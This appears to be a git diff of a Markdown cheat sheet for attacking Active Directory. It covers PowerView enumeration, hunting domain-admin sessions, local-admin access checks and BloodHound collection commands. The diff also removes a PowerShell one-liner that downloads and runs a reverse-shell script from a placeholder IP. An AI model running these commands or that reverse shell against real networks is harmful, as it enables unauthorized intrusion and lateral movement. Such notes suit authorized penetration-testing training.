@@ -5,7 +5,8 @@
 * [Powerview GPO](#Powerview-GPO)
 * [Powerview ACL](#Powerview-ACL)
 * [Powerview Domain Trust](#Powerview-Domain-Trust)
-* [Misc](#misc)
+* [User Hunting](#User-Hunting)
+* [Bloodhound](#Bloodhound)
 
 ## Powerview Domain
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
@@ -248,12 +249,14 @@ Get-NetForestTrust -Forest <domain name>
 Get-NetForestDomain -Verbose | Get-NetDomainTrust
 ```
 
-## Misc
-####  Powerview Find all machines on the current domain where the current user has local admin access
+## User Hunting
+### Check Local Admin Access
+#### Powerview
 ```
 Find-LocalAdminAccess -Verbose
 ```
 
+### Other scripts
 ```
 . ./Find-WMILocalAdminAccess.ps1
 Find-WMILocalAdminAccess
@@ -264,44 +267,30 @@ Find-WMILocalAdminAccess
 Find-PSRemotingLocalAdminAccess
 ```
 
-####  Powerview Find local admins on all machines of the domain (needs admin privs)
+#### Find computers where DA has sessions
 ```
-Invoke-EnumerateLocalAdmin -Verbose
-```
-
-#### Connect to machine with administrator privs
-```
-Enter-PSSession -Computername <computername>
+Find-DomainUserLocation -Verbose
+Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
 ```
 
-#### Save and use sessions of a machine
+#### Find computers where a domain admin session is available and current user has admin access
 ```
-$sess = New-PSSession -Computername <computername>
-Enter-PSSession $sess
-```
-
-####  Find active sessions
-```
-Invoke-UserHunter
-Invoke-UserHunter -Groupname "RDPUsers"
+Find-DomainUserLocation -CheckAccess
 ```
 
-####  Find active sessions of domain admins
+#### Find computers (File servers and distributed file servers) where a domain admin session is available
 ```
-Invoke-UserHunter -Groupname "Domain Admins"
-```
-
-####  check access to machine
-```
-Invoke-UserHunter -CheckAccess
+Find-DomainUserLocation –Stealth
 ```
 
-####  BloodHound
+##  BloodHound
 https://github.com/BloodHoundAD/BloodHound
 ```
 cd Ingestors
 . ./sharphound.ps1
 Invoke-Bloodhound -CollectionMethod all -Verbose
+Invoke-Bloodhound -CollectionMethod Acl -Verbose
+Invoke-Bloodhound -CollectionMethod Sessions -Verbose
 Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
 
 #Copy neo4j-community-3.5.1 to C:\
@@ -312,9 +301,4 @@ neo4j.bat start
 #Browse to BloodHound-win32-x64
 Run BloodHound.exe
 #Change credentials and login
-```
-
-####  Powershell reverse shell
-```
-Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
 ```
